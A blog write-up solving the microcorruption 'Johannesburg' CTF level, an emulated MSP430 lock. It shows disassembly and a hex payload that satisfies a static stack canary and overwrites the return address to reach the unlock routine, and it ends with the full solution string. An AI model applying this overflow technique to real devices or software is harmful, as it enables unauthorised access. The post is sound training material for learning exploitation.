---
title: "microcorruption - johannesburg"
date: 2018-03-09T14:31:25+02:00
categories: 
- ctf
- exploit
- assembly
- microcorruption
- johannesburg
---

{{< figure src="/images/microcorruption/microcorruption.png" >}}

This post is part of the series of solving [microcorruption.com](https://microcorruption.com) ctf challenges which continues from the [previous challenge](https://leonjza.github.io/blog/2018/03/07/microcorruption---whitehorse/) called _Montevideo_. This challenge is titled _Johannesburg_.

The challenge has the following description when you start:

> This is Software Revision 04. We have improved the security of the lock by ensuring passwords that are too long will be rejected.

Alright. This might mean that we are done with the overflow challenges? Lets dive in!
<!--more-->

## johannesburg

Just like we have seen in a number of previous challenges now, Johannesburg follows a similar structure with the `main` routine simply calling `login`. Within the `login` routine a number of steps are taken.

```asm
452c <login>

[.. get the password with getsn ..]

4552:  3e40 0024      mov   #0x2400, r14
4556:  0f41           mov   sp, r15

; maybe copying the password to a different location
; in memory again.
4558:  b012 2446      call  #0x4624 <strcpy>
455c:  0f41           mov   sp, r15

; check the password. routine issues syscall 0x7d which
; will ask the HSM to validate.
455e:  b012 5244      call  #0x4452 <test_password_valid>
4562:  0f93           tst   r15
4564:  0524           jz    #0x4570 <login+0x44>
4566:  b012 4644      call  #0x4446 <unlock_door>

[.. messages about the status of the unlock ..]

; ooh, interesting random single byte compare? Seems like
; this is specifically for a length check. lol.
4578:  f190 6a00 1100 cmp.b #0x6a, 0x11(sp)
457e:  0624           jeq   #0x458c <login+0x60>
4580:  3f40 ff44      mov   #0x44ff "Invalid Password Length: password too long.", r15
4584:  b012 f845      call  #0x45f8 <puts>
4588:  3040 3c44      br    #0x443c <__stop_progExec__>
458c:  3150 1200      add   #0x12, sp
4590:  3041           ret
```

Everything seems to be pretty much as expected, apart from the byte compare that happens at `0x4578`. The instruction at `0x4578` compares the byte that is at `sp + 0x11` with `0x6a`, just like a static stack canary.

To inspect this a little closer, I set a breakpoint at the `cmp.b` instruction with `break 4578` and entered 20 `41`'s as a hex encoded password.

{{< figure src="/images/microcorruption/johannesburg_stack_canary.png" >}}

Stepping through the program to pass the `jeq` instruction saw that the program would not take the jump and continue to print the message about the password being too long. Inspecting the memory with `read sp+11` also showed that the byte contained `41`, which will cause the `cmp.b` to fail. 

To bypass this check, all we need to do is provide `0x6a` in the correct position so that the `cmp.b` will be equal. Inspecting the memory (as well as the instruction `0x11(sp)`), we can see this is at offset 17. All we need to do is pad the password payload and provide `0x6a` as the 17th byte.

```python
python -c "print('41' * 0x11 + '6A' + '42' * 10)"
41414141414141414141414141414141416A42424242424242424242
```

{{< figure src="/images/microcorruption/johannesburg_stack_canary.png" >}}

Once the canary check has passed, the code flow jumps to `0x458c` which adds `0x12` to the stack pointer which also happens to be right after the canary value. Considering we have a nice helper routine to unlock the lock at `0x4446`, all we need to do is provide that (little endian formatted) address to jump to and profit.

```python
python -c "print('41' * 0x11 + '6A' + '4644')"
41414141414141414141414141414141416A4644
```

{{< figure src="/images/microcorruption/johannesburg_solve.png" >}}

## solution

Enter `41414141414141414141414141414141416A4644` as hex encoded input.

## other challenges

For my other write ups in the microcorruption series, checkout [this](https://leonjza.github.io/categories/microcorruption/) link.
